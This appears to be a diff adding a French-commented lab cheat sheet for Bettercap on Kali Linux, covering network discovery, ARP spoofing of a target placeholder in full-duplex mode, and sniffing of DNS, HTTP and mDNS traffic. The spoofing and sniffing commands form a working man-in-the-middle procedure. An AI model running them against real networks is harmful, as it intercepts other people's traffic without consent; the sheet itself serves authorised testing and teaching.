@@ -1,0 +1,97 @@
+# ==========================================================
+# 1. KALI LINUX — BASIC COMMANDS
+# ==========================================================
+
+pwd
+# Affiche le chemin du répertoire de travail actuel.
+
+ip a
+# Affiche les interfaces réseau et leurs adresses IP et MAC.
+
+sudo su
+# Permet de passer en mode administrateur (root).
+
+
+# ==========================================================
+# 2. LAUNCH BETTERCAP
+# ==========================================================
+
+bettercap
+# Lance Bettercap, un outil d'analyse et de sécurité réseau.
+
+
+# ==========================================================
+# 3. HELP
+# ==========================================================
+
+help
+# Affiche les modules et les commandes disponibles dans Bettercap.
+
+
+# ==========================================================
+# 4. NETWORK DISCOVERY
+# ==========================================================
+
+net.probe on
+# Active la découverte des équipements connectés au réseau local.
+
+net.show
+# Affiche les appareils découverts :
+# - Adresse IP
+# - Adresse MAC
+# - Nom de l'équipement (si disponible)
+# - Informations sur le fabricant (si disponibles)
+
+
+# ==========================================================
+# 5. ARP SPOOFING CONFIGURATION
+# ==========================================================
+
+help arp.spoof
+# Affiche les informations et les paramètres du module ARP Spoofing.
+
+set arp.spoof.fullduplex true
+# Configure le mode full-duplex.
+# Ce mode vise à rediriger le trafic dans les deux sens
+# entre la cible et la passerelle lors d'une simulation MITM.
+
+set arp.spoof.targets 192.168.100.X
+# Définit l'adresse IP de l'équipement de test autorisé.
+# Remplacer X par l'adresse IP correspondante.
+
+
+# ==========================================================
+# 6. NETWORK TRAFFIC SNIFFING
+# ==========================================================
+
+set net.sniff.local true
+# Configure Bettercap pour inclure le trafic provenant
+# de la machine Kali Linux elle-même.
+
+net.sniff on
+# Active la capture et l'analyse des paquets réseau visibles.
+# Permet notamment d'observer certains protocoles :
+# - DNS
+# - HTTP non chiffré
+# - mDNS
+# - Autres paquets accessibles à l'interface réseau
+# Ne garantit pas la capture de toutes les requêtes.
+
+
+# ==========================================================
+# 7. STOP NETWORK MONITORING
+# ==========================================================
+
+net.sniff off
+# Arrête la capture des paquets réseau.
+
+net.probe off
+# Désactive la découverte active des équipements.
+
+
+# ==========================================================
+# 8. EXIT BETTERCAP
+# ==========================================================
+
+quit
+# Ferme Bettercap et retourne au terminal Kali Linux.
